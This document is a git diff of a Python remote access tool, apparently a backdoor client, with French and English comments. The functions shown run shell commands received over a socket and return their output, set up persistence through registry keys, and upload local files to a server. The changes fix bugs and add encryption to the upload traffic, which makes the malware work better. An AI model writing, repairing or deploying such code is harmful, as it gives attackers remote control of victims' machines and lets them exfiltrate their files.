@@ -37,7 +37,7 @@ key = "0123456789101112"                     #Encryption key (16 characters) use
 
 ###Functions###
 #send message to server
-def send(msg):
+def send(msg, soc):
     soc.send(encrypt(key, msg))
 
 #acquire system plateform
@@ -92,7 +92,7 @@ def persistence(plat):
     #if plat == "unk":
         #device not yet supported
 
-def execute(soc): #àrefaire
+def execute(soc): #à refaire
     cmd = ""
     #use command exit to exit terminal
     while cmd != "exit":
@@ -104,10 +104,12 @@ def execute(soc): #àrefaire
             stdin=subprocess.PIPE,
             stderr=subprocess.PIPE,
             stdout=subprocess.PIPE)
-        out = process.stdout.read() + process.stderr.read()
+        out = process.stdout.read() + process.stderr.read() #out is in binary
+        out = out.decode("utf-8", "ignore") #decode out
         print(out)
-        send(encrypt(key, out))
-        process.kill
+        soc.send(encrypt(key, out))
+    print("process kill")
+    process.kill()
 
 def uninstall():
     #delete key in registers
@@ -171,7 +173,7 @@ def upload(path_file):
     if do:
         octets = os.path.getsize(path_file) / 1024
         info = (path_file, octets)
-        soc.send(info)
+        soc.send(encrypt(key, info))
         num = 0
         octets = octets * 1024
         file = open(path_file, "rb") #open file in read only and binary mod
@@ -187,7 +189,7 @@ def upload(path_file):
                 num += 1024
         else:
             donnees = file.read()
-            soc.send(donnees)
+            soc.send(encrypt(key, donnees))
         file.close
         soc.send(encrypt(key, "Upload finished"))
 
